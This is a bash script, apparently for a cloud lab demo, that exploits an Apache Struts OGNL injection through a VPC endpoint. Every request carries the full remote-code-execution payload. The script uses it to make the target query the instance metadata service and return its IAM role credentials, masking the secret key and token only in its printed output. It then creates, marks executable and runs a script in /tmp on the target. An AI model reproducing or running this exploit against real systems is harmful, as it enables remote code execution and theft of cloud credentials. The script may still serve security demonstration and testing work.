#!/bin/bash

# Print exploiting message with the actual endpoint
echo "using struts to retrieve keys from producer-vm through VPC_ENDPOINT_DNS_NAME"

# Retrieve IAM role name
CMD_ROLE="curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
ENCODED_CMD_ROLE=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$CMD_ROLE'))")

ROLE_NAME=$(curl -s "http://VPC_ENDPOINT_DNS_NAME:8080/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=${ENCODED_CMD_ROLE}")

# Retrieve IAM role credentials
CMD_CREDS="curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE_NAME}"
ENCODED_CMD_CREDS=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$CMD_CREDS'))")

# Get the credentials and obfuscate SecretAccessKey using jq
CREDS=$(curl -s "http://VPC_ENDPOINT_DNS_NAME:8080/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=${ENCODED_CMD_CREDS}")

OBFUSCATED_CREDS=$(echo "$CREDS" | jq '.SecretAccessKey |= "*****REDACTED*****" | del(.Token)')

# Print the obfuscated credentials
echo "$OBFUSCATED_CREDS"

# Print exploiting message with the actual endpoint
echo "using struts to create, escalate permissions, and execute a root-level shell script through VPC_ENDPOINT_DNS_NAME"

CMD_CREATE_FILE="touch /tmp/balls.sh"
ENCODED_CMD_CREATE_FILE=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$CMD_CREATE_FILE'))")

curl -s "http://VPC_ENDPOINT_DNS_NAME:8080/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=${ENCODED_CMD_CREATE_FILE}"

CMD_CHMOD="chmod +x /tmp/balls.sh"
ENCODED_CMD_CHMOD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$CMD_CHMOD'))")

curl -s "http://VPC_ENDPOINT_DNS_NAME:8080/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=${ENCODED_CMD_CHMOD}"


CMD_RUN="/tmp/balls.sh"
ENCODED_CMD_RUN=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$CMD_RUN'))")

curl -s "http://VPC_ENDPOINT_DNS_NAME:8080/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=${ENCODED_CMD_RUN}"

echo "Check producer vm for escalated program"